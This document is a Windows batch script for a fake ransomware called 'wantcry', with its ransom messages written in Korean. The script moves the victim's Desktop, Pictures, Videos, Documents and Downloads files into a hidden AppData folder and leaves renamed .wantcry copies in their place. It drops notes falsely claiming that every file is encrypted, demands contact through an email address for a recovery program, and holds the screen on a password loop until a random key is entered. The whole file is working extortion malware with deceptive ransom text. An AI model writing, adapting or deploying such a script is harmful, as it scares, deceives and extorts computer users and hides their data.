@echo off 
color 47 
title don`t exit 
timeout /t 10 
title 이 창을 종료하지 마시오 
del %userprofile%\Desktop\*.wantcry* >nul 2>&1
del %userprofile%\pictures\*.wantcry* >nul 2>&1
del %userprofile%\videos\*.wantcry* >nul 2>&1
del %userprofile%\documents\*.wantcry* >nul 2>&1
del %userprofile%\downloads\*.wantcry* >nul 2>&1
md %userprofile%\AppData\syswindows\ >nul 2>&1
md %userprofile%\AppData\syswindows\desk >nul 2>&1
md %userprofile%\AppData\syswindows\pic >nul 2>&1
md %userprofile%\AppData\syswindows\video >nul 2>&1
md %userprofile%\AppData\syswindows\doc >nul 2>&1
md %userprofile%\AppData\syswindows\down >nul 2>&1
move %userprofile%\Desktop\*.* %userprofile%\AppData\syswindows\desk\
copy %userprofile%\AppData\syswindows\desk\*.* %userprofile%\Desktop\*.wantcry*
move %userprofile%\pictures\*.* %userprofile%\AppData\syswindows\pic\
copy %userprofile%\AppData\syswindows\pic\*.* %userprofile%\pictures\*.wantcry*
move %userprofile%\videos\*.* %userprofile%\AppData\syswindows\video\
copy %userprofile%\AppData\syswindows\video\*.* %userprofile%\videos\*.wantcry*
move %userprofile%\Documents\*.* %userprofile%\AppData\syswindows\doc\
copy %userprofile%\AppData\syswindows\doc\*.* %userprofile%\Documents\*.wantcry*
move %userprofile%\downloads\*.* %userprofile%\AppData\syswindows\down\
copy %userprofile%\AppData\syswindows\down\*.* %userprofile%\downloads\*.wantcry* 
set /a pass=%random% %% 9999+1000
set /a pass2=%random% %% 9999+1000
set /a pass3=%random% %% 9999+1000
set /a pass4=%random% %% 999999+100000
echo %pass%-%pass2%-%pass3%-%pass4% >> %userprofile%\Documents\syslog.wantcry
echo your computer all files is encrypted >> %userprofile%\Desktop\readmeusa.txt 
echo 당신의 컴퓨터에 있는 모든 파일이 암호화되었습니다 >> %userprofile%\Desktop\readmekr.txt 
title wantcry 랜섬웨어 
:wow
cls
echo wantcry 랜섬웨어
echo -----------------------------------------------------------               
echo 제 파일은 어떻게 되었습니까? 
echo 당신의 파일은 우리 소프트웨어에서 보호제공을 받으며            
echo 복구를 할때까지 파일을 사용할수 없습니다 
echo -----------------------------------------------------------
echo 어떻게 복구합니까? 
echo 복구를 하려면 복구 프로그램이 필요합니다 
echo 복구 프로그램를 얻는 방법은 쉽습니다
echo codewantcrydecrepter@gmail.com 으로 연락하십시오
echo -----------------------------------------------------------
echo 만약 컴퓨터를 다시시작한다면 재부팅해도 소용없을겁니다 
echo 만약 wantcry 랜섬웨어를 제거할 경우 파일이 안전하지 않을것 입니다.  
echo 만약에 복구키를 가지고 있다면 아래 창에다 입력하십시오
echo ----------------------------------------------------------- 
set /p password=입력:
if %password% == %pass%-%pass2%-%pass3%-%pass4% goto pass
cls 
echo 암호가 다릅니다 
pause 
goto wow 
 
:pass 
cls
echo 복구중...
echo 절대 이 창을 닫지 마십시오. 
timeout/t 5 /nobreak >nul
del %userprofile%\Desktop\*.wantcry*
move %userprofile%\AppData\syswindows\desk\*.* %userprofile%\Desktop\
del %userprofile%\pictures\*.wantcry*
move %userprofile%\AppData\syswindows\pic\*.* %userprofile%\pictures\
del %userprofile%\videos\*.wantcry*
move %userprofile%\AppData\syswindows\video\*.* %userprofile%\videos\
del %userprofile%\documents\*.wantcry*
move %userprofile%\AppData\syswindows\doc\*.* %userprofile%\documents\
del %userprofile%\downloads\*.wantcry*
move %userprofile%\AppData\syswindows\down\*.* %userprofile%\downloads\ 
del %userprofile%\Desktop\*readmekr.txt* 
del %userprofile%\Desktop\*readmeusa.txt*
cls
del %userprofile%\documents\*syslog.wantcry*
rmdir /s /q "%userprofile%\AppData\syswindows"
cls
exit